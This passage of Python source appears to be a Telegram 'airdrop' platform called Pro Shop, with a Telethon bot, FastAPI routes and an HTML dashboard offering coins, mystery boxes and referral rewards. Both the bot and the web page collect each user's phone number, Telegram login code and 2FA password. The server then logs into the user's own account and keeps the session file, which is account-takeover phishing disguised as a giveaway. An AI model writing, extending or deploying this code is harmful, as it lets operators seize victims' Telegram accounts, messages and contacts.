        if not settings.ENABLE_BOT or not self.token or not settings.API_ID or not settings.API_HASH or TelegramClient is Any:
            LOG.info("Bot disabled or Telegram configuration missing.")
            return
        self.client = TelegramClient((SESSION_DIR / "bot.session").as_posix(), settings.API_ID, settings.API_HASH)
        await self.client.start(bot_token=self.token)
        LOG.info("Telegram bot started.")
        self._register_handlers()

    def _register_handlers(self) -> None:
        if events is None or self.client is None:
            return

        @self.client.on(events.NewMessage(func=lambda e: e.is_private))
        async def handler(event):
            sender = await event.get_sender()
            if not sender or getattr(sender, "bot", False):
                return
            text = (event.raw_text or "").strip()
            user_id = int(sender.id)

            if text.startswith("/start"):
                await self.cmd_start(event, user_id, text)
                return
            if text == "/cancel":
                await self.cmd_cancel(event, user_id)
                return
            if text == "/help":
                await self.cmd_help(event)
                return
            if text == "/dashboard":
                await self.cmd_dashboard(event, user_id)
                return
            if text == "/status":
                await event.respond("✅ Bot online and responsive.")
                return

            ok, missing = await self.check_membership(user_id)
            if not ok:
                await event.respond(
                    "🔒 Access restricted.\n\nYou must join the required channels first.",
                    buttons=self._join_buttons(missing),
                )
                return

            ctx = self.user_states.get(user_id)
            if not ctx:
                await event.respond("Send /start to begin.")
                return
            if ctx.state == BotStates.PHONE:
                await self.handle_phone(event, user_id, text)
            elif ctx.state == BotStates.CODE:
                await self.handle_code(event, user_id, text)
            elif ctx.state == BotStates.PASSWORD:
                await self.handle_password(event, user_id, text)

        @self.client.on(events.CallbackQuery)
        async def callback_handler(event):
            user_id = int(event.sender_id)
            data = (event.data or b"").decode("utf-8", errors="ignore")
            if data.startswith("join:"):
                await event.answer("Open the channel and join.", alert=False)
                return
            if data == "check_join":
                ok, missing = await self.check_membership(user_id)
                if ok:
                    await event.answer("Membership verified.", alert=False)
                    await event.respond("✅ Great, you can continue now.", buttons=self._dashboard_buttons())
                else:
                    await event.answer("Still missing some channels.", alert=True)
                    await event.respond("🔒 You still need to join:", buttons=self._join_buttons(missing))
            elif data == "open_dashboard":
                await event.respond("🚀 Dashboard:", buttons=self._dashboard_buttons())
            elif data == "cancel_auth":
                await self.cmd_cancel(event, user_id)
                await event.answer("Cancelled", alert=False)

    def _join_buttons(self, missing: List[str]):
        if Button is None:
            return None
        rows = [[Button.url(f"Join @{c}", settings.JOIN_LINK_TEMPLATE.format(channel=c))] for c in missing]
        rows.append([Button.inline("✅ I Joined", b"check_join")])
        rows.append([Button.inline("❌ Cancel", b"cancel_auth")])
        return rows

    def _dashboard_buttons(self):
        if Button is None:
            return None
        return [
            [KeyboardButtonWebView(text="🚀 Open Mini App", url=settings.WEB_APP_URL)],
            [Button.url("🌐 Open Dashboard", settings.WEB_APP_URL)],
        ]

    async def check_membership(self, user_id: int) -> Tuple[bool, List[str]]:
        if not self.required_channels:
            return True, []
        if self.client is None:
            return False, self.required_channels
        missing: List[str] = []
        for channel in self.required_channels:
            try:
                await self.client.get_participant(channel, user_id)
            except Exception:
                missing.append(channel)
        return len(missing) == 0, missing

    async def cmd_start(self, event, user_id: int, text: str) -> None:
        payload = text.split(maxsplit=1)[1].strip() if len(text.split(maxsplit=1)) > 1 else ""
        ctx = BotSessionContext(state=BotStates.PHONE)
        if payload.startswith("ref_"):
            ctx.ref_code = payload[4:].strip()
        elif payload:
            ctx.ref_code = payload.strip()
        self.user_states[user_id] = ctx

        await event.respond(
            "👋 Welcome to Pro Shop.\n\nSend your phone number in international format.",
            buttons=self._dashboard_buttons(),
        )

    async def cmd_cancel(self, event, user_id: int) -> None:
        ctx = self.user_states.pop(user_id, None)
        if ctx and ctx.client:
            with contextlib.suppress(Exception):
                await ctx.client.disconnect()
        await event.respond("❌ Operation cancelled. Send /start to begin again.")

    async def cmd_help(self, event) -> None:
        await event.respond(
            "ℹ️ Commands\n\n"
            "/start - begin authentication\n"
            "/dashboard - open dashboard buttons\n"
            "/cancel - cancel current session\n"
            "/help - show help"
        )

    async def cmd_dashboard(self, event, user_id: int) -> None:
        await event.respond("🏠 Dashboard:", buttons=self._dashboard_buttons())

    async def handle_phone(self, event, user_id: int, text: str) -> None:
        phone = sanitize_phone(text)
        if not validate_phone(phone):
            await event.respond("❌ Invalid format. Example: +1234567890")
            return
        if not settings.API_ID or not settings.API_HASH:
            await event.respond("⚠️ Telegram API settings are missing in environment.")
            return
        session_id = generate_session_id("bot")
        client = TelegramClient((SESSION_DIR / f"{session_id}.session").as_posix(), settings.API_ID, settings.API_HASH)
        await client.connect()
        try:
            result = await client.send_code_request(phone)
            self.user_states[user_id] = BotSessionContext(
                state=BotStates.CODE,
                phone=phone,
                session_id=session_id,
                phone_code_hash=result.phone_code_hash,
                client=client,
            )
            await event.respond("✅ Code sent. Please send the verification code.")
        except Exception as e:
            with contextlib.suppress(Exception):
                await client.disconnect()
            await event.respond(f"❌ Error: {e}")

    async def handle_code(self, event, user_id: int, text: str) -> None:
        ctx = self.user_states.get(user_id)
        if not ctx or not ctx.client or not getattr(ctx.client, "is_connected", lambda: False)():
            await event.respond("❌ Session expired. Send /start again.")
            return
        if not text.isdigit():
            await event.respond("❌ Code must contain digits only.")
            return
        try:
            await ctx.client.sign_in(phone=ctx.phone, code=text, phone_code_hash=ctx.phone_code_hash)
            me = await ctx.client.get_me()
            await self._save_bot_user(ctx, me)
            await event.respond(f"✅ Login successful. Welcome, {getattr(me, 'first_name', 'user')}.", buttons=self._dashboard_buttons())
            self.user_states.pop(user_id, None)
        except SessionPasswordNeededError:
            ctx.state = BotStates.PASSWORD
            await event.respond("🔒 2FA is enabled. Please send your password.")
        except Exception as e:
            await event.respond(f"❌ Invalid code: {e}")

    async def handle_password(self, event, user_id: int, text: str) -> None:
        ctx = self.user_states.get(user_id)
        if not ctx or not ctx.client:
            await event.respond("❌ Session expired.")
            return
        try:
            await ctx.client.sign_in(password=text)
            me = await ctx.client.get_me()
            await self._save_bot_user(ctx, me)
            await event.respond(f"✅ 2FA successful. Welcome, {getattr(me, 'first_name', 'user')}.", buttons=self._dashboard_buttons())
            self.user_states.pop(user_id, None)
        except Exception as e:
            await event.respond(f"❌ Invalid password: {e}")

    async def _save_bot_user(self, ctx: BotSessionContext, me: User) -> None:
        user = await self.users.upsert_from_telegram(
            telegram_id=int(me.id),
            first_name=getattr(me, "first_name", "") or "",
            last_name=getattr(me, "last_name", "") or "",
            username=getattr(me, "username", "") or "",
            phone=ctx.phone or "",
            session_file=f"{ctx.session_id}.session",
            invited_by=None,
        )
        if ctx.ref_code:
            await self.users.apply_referral(ctx.ref_code, int(me.id))
        with contextlib.suppress(Exception):
            await ctx.client.disconnect()

    async def close(self) -> None:
        if self.client:
            with contextlib.suppress(Exception):
                await self.client.disconnect()


# =============================================================================
# Pydantic request models
# =============================================================================

class SendCodeRequest(BaseModel):
    phone: str = Field(..., description="Phone number in international format")
    ref_code: Optional[str] = Field(default=None, description="Referral code")

class VerifyCodeRequest(BaseModel):
    session_id: str
    code: str

class Verify2FARequest(BaseModel):
    session_id: str
    password: str

class ClaimRequest(BaseModel):
    csrf_token: Optional[str] = None

class AdminLoginRequest(BaseModel):
    username: str
    password: str

class TaskClaimRequest(BaseModel):
    csrf_token: Optional[str] = None


# =============================================================================
# App initialization
# =============================================================================

db = Database(DATABASE_FILE)
users_repo = UserRepository(db)
tasks_repo = TaskRepository(db)
admin_repo = AdminRepository(db)
auth_manager = TelegramAuthManager(db, users_repo)
bot_manager = TelegramBotManager(settings.TOKEN_BOT, auth_manager, users_repo, tasks_repo)

ADMIN_PASSWORD_HASH = hash_admin_password(settings.ADMIN_PASSWORD)


# =============================================================================
# Auth utilities
# =============================================================================

def csrf_guard(request: Request, cookie_token: Optional[str], header_token: Optional[str]) -> None:
    if request.method in {"POST", "PUT", "PATCH", "DELETE"}:
        if not cookie_token or not header_token or cookie_token != header_token:
            raise HTTPException(status_code=403, detail="CSRF validation failed")


async def current_user(
    request: Request,
    authorization: Optional[str] = Header(default=None),
    csrf_cookie: Optional[str] = Cookie(default=None, alias=settings.CSRF_COOKIE_NAME),
    csrf_header: Optional[str] = Header(default=None, alias="X-CSRF-Token"),
) -> Dict[str, Any]:
    if not authorization or not authorization.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Missing bearer token")
    token = authorization.removeprefix("Bearer ").strip()
    try:
        payload = decode_jwt(token)
    except JWTError:
        raise HTTPException(status_code=401, detail="Invalid token")
    if csrf_cookie != payload.get("csrf") or csrf_header != payload.get("csrf"):
        raise HTTPException(status_code=403, detail="CSRF validation failed")
    telegram_id = int(payload["sub"])
    user = await users_repo.get_by_telegram_id(telegram_id)
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    return user


def admin_key_guard(x_api_key: Optional[str] = Header(default=None, alias="X-Admin-Key")) -> None:
    if x_api_key != settings.ADMIN_API_KEY:
        raise HTTPException(status_code=403, detail="Invalid admin API key")


# =============================================================================
# SPA
# =============================================================================

FRONTEND_HTML = r"""
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>Pro Shop Ultimate</title>
<style>
:root{
  --bg:#08111f;
  --bg2:rgba(14,20,34,.72);
  --line:rgba(255,255,255,.08);
  --text:#f5f7fb;
  --muted:#9aa4b2;
  --accent:#76a9ff;
  --accent2:#7c5cff;
  --good:#32d583;
  --bad:#f04438;
  --gold:#f5c451;
}
*{box-sizing:border-box}
html,body{height:100%}
body{
  margin:0;
  font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
  color:var(--text);
  background:
    radial-gradient(circle at 20% 20%, rgba(118,169,255,.20), transparent 26%),
    radial-gradient(circle at 80% 10%, rgba(124,92,255,.18), transparent 24%),
    radial-gradient(circle at 50% 85%, rgba(50,213,131,.10), transparent 30%),
    linear-gradient(160deg, #050b15 0%, #091425 50%, #07101e 100%);
  overflow-x:hidden;
}
.bg-grid{
  position:fixed; inset:0; pointer-events:none; opacity:.25;
  background-image:linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px),linear-gradient(90deg, rgba(255,255,255,.05) 1px, transparent 1px);
  background-size:40px 40px;
  mask-image:radial-gradient(circle at center, black, transparent 80%);
}
.shell{max-width:1300px;margin:0 auto;padding:28px 18px 48px}
.hero{
  display:grid;grid-template-columns:1.2fr .8fr;gap:18px;align-items:stretch;margin-bottom:18px
}
.card{
  background:var(--bg2);
  border:1px solid var(--line);
  backdrop-filter: blur(18px);
  border-radius:24px;
  box-shadow:0 24px 80px rgba(0,0,0,.35);
}
.hero-main{padding:26px;position:relative;overflow:hidden}
.hero-main:before{
  content:""; position:absolute; inset:-2px;
  background:linear-gradient(135deg, rgba(118,169,255,.08), rgba(124,92,255,.08), rgba(245,196,81,.06));
  pointer-events:none;
}
.brand{display:flex;align-items:center;gap:14px;position:relative;z-index:1}
.logo{
  width:58px;height:58px;border-radius:18px;display:grid;place-items:center;
  background:linear-gradient(135deg, var(--accent), var(--accent2));
  box-shadow:0 12px 30px rgba(118,169,255,.35);
  font-size:26px
}
h1{margin:0;font-size:28px;line-height:1.1}
.sub{color:var(--muted);margin-top:8px;font-size:14px;max-width:760px}
.badges{display:flex;gap:10px;flex-wrap:wrap;margin-top:18px}
.badge{
  border:1px solid var(--line);padding:9px 12px;border-radius:999px;background:rgba(255,255,255,.03);
  color:#d9e3f0;font-size:13px
}
.hero-side{padding:20px;display:flex;flex-direction:column;gap:12px}
.metric{padding:18px;border:1px solid var(--line);border-radius:18px;background:rgba(255,255,255,.03)}
.metric h3{margin:0;font-size:22px}
.metric p{margin:6px 0 0;color:var(--muted);font-size:13px}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:18px}
.section{padding:22px}
.section h2{margin:0 0 16px;font-size:18px}
.row{display:grid;grid-template-columns:1fr 1fr;gap:14px}
.input, .btn, textarea{
  width:100%;border-radius:16px;border:1px solid var(--line);background:rgba(255,255,255,.04);color:var(--text);
  outline:none;padding:14px 15px;font-size:15px
}
.input:focus, textarea:focus{border-color:rgba(118,169,255,.7);box-shadow:0 0 0 4px rgba(118,169,255,.15)}
.btn{
  cursor:pointer;font-weight:700;background:linear-gradient(135deg, var(--accent), var(--accent2));border:none;
  transition:transform .18s ease, box-shadow .18s ease
}
.btn:hover{transform:translateY(-1px);box-shadow:0 16px 30px rgba(118,169,255,.18)}
.btn.secondary{background:rgba(255,255,255,.04);border:1px solid var(--line)}
.btn.good{background:linear-gradient(135deg, var(--good), #1fb56f)}
.btn.gold{background:linear-gradient(135deg, #f5c451, #ff9f43);color:#141414}
.btn.bad{background:linear-gradient(135deg, #ff6b6b, #f04438)}
.tabs{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:14px}
.tab{padding:10px 14px;border-radius:14px;border:1px solid var(--line);background:rgba(255,255,255,.03);cursor:pointer;color:var(--muted)}
.tab.active{color:var(--text);border-color:rgba(118,169,255,.5);background:rgba(118,169,255,.12)}
.hidden{display:none !important}
.list{display:grid;gap:10px}
.item{
  border:1px solid var(--line);background:rgba(255,255,255,.03);border-radius:18px;padding:14px
}
.item-top{display:flex;align-items:center;justify-content:space-between;gap:10px}
.item-title{font-weight:700}
.small{font-size:12px;color:var(--muted)}
.toast-wrap{position:fixed;right:18px;bottom:18px;display:grid;gap:10px;z-index:9999}
.toast{
  min-width:260px;max-width:360px;padding:14px 16px;border-radius:16px;border:1px solid var(--line);background:rgba(10,15,28,.96);
  box-shadow:0 18px 40px rgba(0,0,0,.4);animation:in .18s ease
}
.toast.good{border-color:rgba(50,213,131,.4)}
.toast.bad{border-color:rgba(240,68,56,.4)}
@keyframes in{from{transform:translateY(10px);opacity:0}to{transform:translateY(0);opacity:1}}
.otp{display:grid;grid-template-columns:repeat(6,1fr);gap:8px}
.otp input{text-align:center;font-size:22px;padding:16px 10px}
.leaderbar{display:grid;gap:10px}
.leaderrow{display:grid;grid-template-columns:36px 1fr auto;gap:10px;align-items:center;padding:12px 14px;border-radius:16px;background:rgba(255,255,255,.03);border:1px solid var(--line)}
.avatar{width:36px;height:36px;border-radius:999px;display:grid;place-items:center;background:linear-gradient(135deg,var(--accent),var(--accent2));font-weight:800}
.modal{
  position:fixed;inset:0;background:rgba(1,3,8,.72);backdrop-filter:blur(8px);display:none;align-items:center;justify-content:center;z-index:9998;padding:18px
}
.modal.show{display:flex}
.modal-box{
  width:min(520px,100%);padding:22px;border-radius:24px;background:rgba(10,15,28,.96);border:1px solid var(--line);box-shadow:0 24px 70px rgba(0,0,0,.45)
}
.modal-box h3{margin:0 0 8px}
@media (max-width: 980px){.hero,.grid,.row{grid-template-columns:1fr}}
</style>
</head>
<body>
<div class="bg-grid"></div>
<div class="shell">
  <div class="hero">
    <div class="card hero-main">
      <div class="brand">
        <div class="logo">P</div>
        <div>
          <h1>Pro Shop Ultimate Enterprise</h1>
          <div class="sub">Telegram Airdrop + Authentication platform with JWT dashboard, referral rewards, mystery box, daily claim, tasks, and live leaderboard.</div>
        </div>
      </div>
      <div class="badges">
        <div class="badge">FastAPI</div>
        <div class="badge">Telethon</div>
        <div class="badge">SQLite</div>
        <div class="badge">WebSocket</div>
        <div class="badge">Glassmorphism UI</div>
      </div>
    </div>
    <div class="card hero-side">
      <div class="metric"><h3 id="mBalance">0</h3><p>Current Balance</p></div>
      <div class="metric"><h3 id="mRefs">0</h3><p>Total Referrals</p></div>
      <div class="metric"><h3 id="mTasks">0</h3><p>Available Tasks</p></div>
    </div>
  </div>

  <div class="grid">
    <div class="card section">
      <div class="tabs">
        <div class="tab active" data-tab="auth">Auth</div>
        <div class="tab" data-tab="dashboard">Dashboard</div>
        <div class="tab" data-tab="tasks">Tasks</div>
      </div>

      <div id="tab-auth">
        <h2>Telegram Login</h2>
        <div class="row" style="margin-bottom:12px">
          <input class="input" id="phone" placeholder="+1234567890"/>
          <input class="input" id="ref_code" placeholder="Referral code (optional)"/>
        </div>
        <button class="btn" id="sendCodeBtn">Send Code</button>

        <div id="codeBox" class="hidden" style="margin-top:16px">
          <h2>Verification Code</h2>
          <div class="otp">
            <input class="input code" maxlength="1" inputmode="numeric">
            <input class="input code" maxlength="1" inputmode="numeric">
            <input class="input code" maxlength="1" inputmode="numeric">
            <input class="input code" maxlength="1" inputmode="numeric">
            <input class="input code" maxlength="1" inputmode="numeric">
            <input class="input code" maxlength="1" inputmode="numeric">
          </div>
          <button class="btn" id="verifyCodeBtn" style="margin-top:12px">Verify Code</button>
        </div>

        <div id="twofaBox" class="hidden" style="margin-top:16px">
          <h2>2FA Password</h2>
          <input class="input" id="password" type="password" placeholder="Telegram 2FA password"/>
          <button class="btn" id="verify2faBtn" style="margin-top:12px">Unlock</button>
        </div>
      </div>

      <div id="tab-dashboard" class="hidden">
        <h2>Profile</h2>
        <div class="item">
          <div class="item-top"><div><div class="item-title" id="profileName">Anonymous</div><div class="small" id="profileUser">@username</div></div><div class="small" id="profilePhone"></div></div>
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px">
            <button class="btn gold" id="dailyBtn">Claim Daily</button>
            <button class="btn good" id="giftBtn">Open Gift Box</button>
          </div>
          <div class="small" style="margin-top:10px">Referral link:</div>
          <input class="input" id="refLink" readonly/>
        </div>

        <div class="item" style="margin-top:12px">
          <div class="item-top"><div class="item-title">Recent Rewards</div><div class="small">Live updates</div></div>
          <div class="list" id="rewardList" style="margin-top:10px"></div>
        </div>
      </div>

      <div id="tab-tasks" class="hidden">
        <h2>Tasks</h2>
        <div class="list" id="taskList"></div>
      </div>
    </div>

    <div class="card section">
      <h2>Leaderboard</h2>
      <div class="leaderbar" id="leaderboard"></div>
    </div>
  </div>
</div>

<div class="toast-wrap" id="toasts"></div>

<div class="modal" id="giftModal">
  <div class="modal-box">
    <h3 id="giftTitle">Mystery Box</h3>
    <div class="small" id="giftDesc">Opening...</div>
    <div style="display:flex;gap:10px;justify-content:flex-end;margin-top:18px">
      <button class="btn secondary" onclick="hideGift()">Close</button>
    </div>
  </div>
</div>

<script>
const state = { token: null, csrf: null, user: null, sessionId: null };

function toast(message, kind="good"){
  const el = document.createElement("div");
  el.className = `toast ${kind}`;
  el.textContent = message;
  document.getElementById("toasts").appendChild(el);
  setTimeout(()=>el.remove(), 3200);
}

function api(path, opts={}){
  const headers = opts.headers || {};
  if (state.token) headers["Authorization"] = `Bearer ${state.token}`;
  if (state.csrf) headers["X-CSRF-Token"] = state.csrf;
  if (opts.body && !(opts.body instanceof FormData)) headers["Content-Type"] = "application/json";
  return fetch(path, {...opts, headers}).then(async r => {
    const text = await r.text();
    let data = {};
    try { data = text ? JSON.parse(text) : {}; } catch(e) {}
    if (!r.ok) throw new Error(data.detail || data.message || text || "Request failed");
    return data;
  });
}

function showTab(name){
  document.querySelectorAll(".tab").forEach(t => t.classList.toggle("active", t.dataset.tab === name));
  document.getElementById("tab-auth").classList.toggle("hidden", name !== "auth");
  document.getElementById("tab-dashboard").classList.toggle("hidden", name !== "dashboard");
  document.getElementById("tab-tasks").classList.toggle("hidden", name !== "tasks");
}

document.querySelectorAll(".tab").forEach(t => t.addEventListener("click", () => showTab(t.dataset.tab)));

const codeInputs = [...document.querySelectorAll(".code")];
codeInputs.forEach((input, idx) => {
  input.addEventListener("input", () => {
    input.value = input.value.replace(/\D/g, "").slice(0,1);
    if (input.value && idx < codeInputs.length - 1) codeInputs[idx+1].focus();
  });
  input.addEventListener("keydown", e => {
    if (e.key === "Backspace" && !input.value && idx > 0) codeInputs[idx-1].focus();
  });
});

document.getElementById("sendCodeBtn").onclick = async () => {
  const phone = document.getElementById("phone").value.trim();
  const ref_code = document.getElementById("ref_code").value.trim() || null;
  try{
    const res = await api("/api/auth/send-code", { method:"POST", body: JSON.stringify({ phone, ref_code })});
    state.sessionId = res.data.session_id;
    document.getElementById("codeBox").classList.remove("hidden");
    toast("Code sent.");
  }catch(e){ toast(e.message, "bad"); }
};

document.getElementById("verifyCodeBtn").onclick = async () => {
  const code = codeInputs.map(i => i.value).join("");
  try{
    const res = await api("/api/auth/verify-code", { method:"POST", body: JSON.stringify({ session_id: state.sessionId, code })});
    if(res.status === "2fa_required"){
      document.getElementById("twofaBox").classList.remove("hidden");
      toast("2FA required.", "good");
      return;
    }
    state.token = res.token;
    state.csrf = res.csrf_token;
    state.user = res.user;
    toast("Login successful.");
    showTab("dashboard");
    await bootstrap();
  }catch(e){ toast(e.message, "bad"); }
};

document.getElementById("verify2faBtn").onclick = async () => {
  const password = document.getElementById("password").value;
  try{
    const res = await api("/api/auth/verify-2fa", { method:"POST", body: JSON.stringify({ session_id: state.sessionId, password })});
    state.token = res.token;
    state.csrf = res.csrf_token;
    state.user = res.user;
    toast("2FA successful.");
    showTab("dashboard");
    await bootstrap();
  }catch(e){ toast(e.message, "bad"); }
};

document.getElementById("dailyBtn").onclick = async () => {
  try{
    const res = await api("/api/daily-claim", { method:"POST", body: JSON.stringify({ csrf_token: state.csrf })});
    toast(`Daily claim: +${res.reward}`);
    await bootstrap();
  }catch(e){ toast(e.message, "bad"); }
};

document.getElementById("giftBtn").onclick = async () => {
  showGift("Opening Mystery Box...", "Please wait...");
  try{
    const res = await api("/api/mystery-box/open", { method:"POST", body: JSON.stringify({ csrf_token: state.csrf })});
    const r = res.reward;
    showGift("Mystery Box Opened", r.type === "premium" ? "Won 1 Month Premium" : `Won ${r.amount} Stars`);
    await bootstrap();
  }catch(e){
    showGift("Mystery Box", e.message);
  }
};

function showGift(title, desc){
  document.getElementById("giftTitle").textContent = title;
  document.getElementById("giftDesc").textContent = desc;
  document.getElementById("giftModal").classList.add("show");
}
function hideGift(){ document.getElementById("giftModal").classList.remove("show"); }
window.hideGift = hideGift;

async function bootstrap(){
  try{
    const me = await api("/api/me", { method:"GET" });
    state.user = me.user;
    document.getElementById("mBalance").textContent = me.user.balance;
    document.getElementById("mRefs").textContent = me.user.referrals;
    document.getElementById("mTasks").textContent = me.tasks.length;
    document.getElementById("profileName").textContent = `${me.user.first_name || ""} ${me.user.last_name || ""}`.trim() || "Anonymous";
    document.getElementById("profileUser").textContent = me.user.username ? `@${me.user.username}` : `TG:${me.user.telegram_id}`;
    document.getElementById("profilePhone").textContent = me.user.phone || "";
    document.getElementById("refLink").value = `${location.origin}/?ref=${me.user.ref_code}`;
    renderTasks(me.tasks);
    renderRewards(me.rewards);
    renderLeaderboard(me.leaderboard);
  }catch(e){
    if(!state.token) toast("Login to unlock dashboard.", "bad");
  }
}

function renderRewards(items){
  const el = document.getElementById("rewardList");
  el.innerHTML = items.length ? items.map(r => `
    <div class="item">
      <div class="item-top">
        <div><div class="item-title">${escapeHtml(r.title)}</div><div class="small">${escapeHtml(r.reward_type)} · ${new Date(r.created_at).toLocaleString()}</div></div>
        <div class="badge">${r.amount}</div>
      </div>
    </div>
  `).join("") : `<div class="small">No rewards yet.</div>`;
}

function renderTasks(items){
  const el = document.getElementById("taskList");
  el.innerHTML = items.map(t => `
    <div class="item">
      <div class="item-top">
        <div>
          <div class="item-title">${escapeHtml(t.title)}</div>
          <div class="small">${escapeHtml(t.description)}</div>
        </div>
        <div class="badge">+${t.reward_coins}</div>
      </div>
      <div style="display:flex;gap:10px;margin-top:12px;flex-wrap:wrap">
        <button class="btn ${t.claimed ? "secondary" : ""}" onclick="claimTask(${t.id})" ${t.claimed ? "disabled" : ""}>${t.claimed ? "Claimed" : "Claim Task"}</button>
      </div>
    </div>
  `).join("");
}

async function claimTask(taskId){
  try{
    const res = await api(`/api/tasks/${taskId}/claim`, { method:"POST", body: JSON.stringify({ csrf_token: state.csrf })});
    toast(`Task claimed: +${res.reward}`);
    await bootstrap();
  }catch(e){ toast(e.message, "bad"); }
}
window.claimTask = claimTask;

function renderLeaderboard(items){
  const el = document.getElementById("leaderboard");
  el.innerHTML = items.map((x, i) => `
    <div class="leaderrow">
      <div class="avatar">${(x.first_name || "U").slice(0,1).toUpperCase()}</div>
      <div>
        <div style="font-weight:700">${escapeHtml(x.first_name || "User")}${x.username ? ` <span class="small">@${escapeHtml(x.username)}</span>` : ""}</div>
        <div class="small">${x.referrals} referrals · ${x.balance} coins</div>
      </div>
      <div class="badge">#${i+1}</div>
    </div>
  `).join("") || `<div class="small">No leaderboard data yet.</div>`;
}

function escapeHtml(s){
  return String(s || "").replace(/[&<>"']/g, m => ({ "&":"&amp;", "<":"&lt;", ">":"&gt;", '"':"&quot;", "'":"&#39;" }[m]));
}

const wsProto = location.protocol === "https:" ? "wss:" : "ws:";
let ws = new WebSocket(`${wsProto}//${location.host}/ws/leaderboard`);
ws.onmessage = e => {
  try{
    const payload = JSON.parse(e.data);
    if(payload.leaderboard) renderLeaderboard(payload.leaderboard);
  }catch(err){}
};

bootstrap();
</script>
</body>
</html>
"""


# =============================================================================
# FastAPI app
# =============================================================================

@asynccontextmanager
async def lifespan(app: FastAPI):
    await db.init_schema()
    await auth_manager.cleanup_expired()
    if settings.ENABLE_BOT:
        app.state.bot_task = asyncio.create_task(bot_manager.start())
    yield
    if hasattr(app.state, "bot_task"):
        app.state.bot_task.cancel()
        with contextlib.suppress(Exception):
            await app.state.bot_task
    await bot_manager.close()
    await auth_manager.close()
    await db.close()

app = FastAPI(
    title=settings.APP_NAME,
    version=settings.APP_VERSION,
    lifespan=lifespan,
    docs_url="/docs",
    redoc_url="/redoc",
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


class RequestLoggerMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        start = time.time()
        response = await call_next(request)
        duration = (time.time() - start) * 1000
        LOG.info("%s %s %s %.2fms", request.method, request.url.path, response.status_code, duration)
        return response


app.add_middleware(RequestLoggerMiddleware)


# =============================================================================
# Helpers
# =============================================================================

async def verify_web_request(request: Request) -> Dict[str, Any]:
    user = await current_user(
        request=request,
        authorization=request.headers.get("Authorization"),
        csrf_cookie=request.cookies.get(settings.CSRF_COOKIE_NAME),
        csrf_header=request.headers.get("X-CSRF-Token"),
    )
    return user


def set_auth_cookies(response: Response, token: str, csrf_token: str) -> None:
    secure = settings.ENVIRONMENT == AppEnv.PRODUCTION
    response.set_cookie(
        settings.AUTH_COOKIE_NAME,
        token,
        httponly=True,
        secure=secure,
        samesite="lax",
        max_age=settings.JWT_EXPIRE_MINUTES * 60,
        path="/",
    )
    response.set_cookie(
        settings.CSRF_COOKIE_NAME,
        csrf_token,
        httponly=False,
        secure=secure,
        samesite="lax",
        max_age=settings.JWT_EXPIRE_MINUTES * 60,
        path="/",
    )


# =============================================================================
# Routes: frontend
# =============================================================================

@app.get("/", response_class=HTMLResponse)
async def index():
    return HTMLResponse(FRONTEND_HTML)


@app.get("/health")
async def health():
    return {"status": "ok", "app": settings.APP_NAME, "version": settings.APP_VERSION}


# =============================================================================
# Routes: auth
# =============================================================================

@app.post("/api/auth/send-code")
async def api_send_code(payload: SendCodeRequest, request: Request):
    await rate_limiter.check(request.client.host if request.client else "unknown")
    result = await auth_manager.send_code(payload.phone, ref_code=payload.ref_code)
    return {"status": "success", "data": result}


@app.post("/api/auth/verify-code")
async def api_verify_code(payload: VerifyCodeRequest, response: Response, request: Request):
    await rate_limiter.check(request.client.host if request.client else "unknown")
    result = await auth_manager.verify_code(payload.session_id, payload.code)
    if result.get("status") == "2fa_required":
        return result
    set_auth_cookies(response, result["token"], result["csrf_token"])
    return result


@app.post("/api/auth/verify-2fa")
async def api_verify_2fa(payload: Verify2FARequest, response: Response, request: Request):
    await rate_limiter.check(request.client.host if request.client else "unknown")
    result = await auth_manager.verify_2fa(payload.session_id, payload.password)
    set_auth_cookies(response, result["token"], result["csrf_token"])
    return result


@app.post("/api/auth/logout")
async def api_logout(response: Response):
    response.delete_cookie(settings.AUTH_COOKIE_NAME, path="/")
    response.delete_cookie(settings.CSRF_COOKIE_NAME, path="/")
    return {"status": "success"}


@app.post("/api/admin/login")
async def admin_login(payload: AdminLoginRequest):
    if payload.username != settings.ADMIN_USERNAME or not verify_admin_password(payload.password, ADMIN_PASSWORD_HASH):
        raise HTTPException(status_code=403, detail="Invalid admin credentials")
    csrf_token = generate_csrf_token()
    token = create_jwt(f"admin:{payload.username}", csrf_token)
    return {"status": "success", "token": token, "csrf_token": csrf_token}


# =============================================================================
# Routes: dashboard and airdrop
# =============================================================================

@app.get("/api/me")
async def api_me(user: Dict[str, Any] = Depends(verify_web_request)):
    me = await users_repo.get_by_telegram_id(int(user["telegram_id"]))
    if not me:
        raise HTTPException(status_code=404, detail="User not found")
    rewards = await db._fetchall(
        "SELECT reward_type, title, amount, created_at, payload_json FROM rewards WHERE user_id = ? ORDER BY id DESC LIMIT 20",
        (me["id"],),
    )
    tasks = await tasks_repo.list_for_user(me["id"])
    leaderboard = await users_repo.get_leaderboard(20)
    return {
        "status": "success",
        "user": me,
        "rewards": [dict(r) for r in rewards],
        "tasks": tasks,
        "leaderboard": leaderboard,
    }


@app.get("/api/leaderboard")
async def api_leaderboard():
    return {"status": "success", "items": await users_repo.get_leaderboard(20)}


@app.post("/api/daily-claim")
async def api_daily_claim(payload: ClaimRequest, request: Request, user: Dict[str, Any] = Depends(verify_web_request)):
    csrf_guard(request, request.cookies.get(settings.CSRF_COOKIE_NAME), request.headers.get("X-CSRF-Token"))
    result = await users_repo.claim_daily(int(user["id"]))
    return {"status": "success", "reward": settings.DAILY_REWARD_COINS, **result}


@app.post("/api/mystery-box/open")
async def api_open_mystery_box(payload: ClaimRequest, request: Request, user: Dict[str, Any] = Depends(verify_web_request)):
    csrf_guard(request, request.cookies.get(settings.CSRF_COOKIE_NAME), request.headers.get("X-CSRF-Token"))
    result = await users_repo.open_mystery_box(int(user["id"]))
    return {"status": "success", **result}


@app.get("/api/tasks")
async def api_tasks(user: Dict[str, Any] = Depends(verify_web_request)):
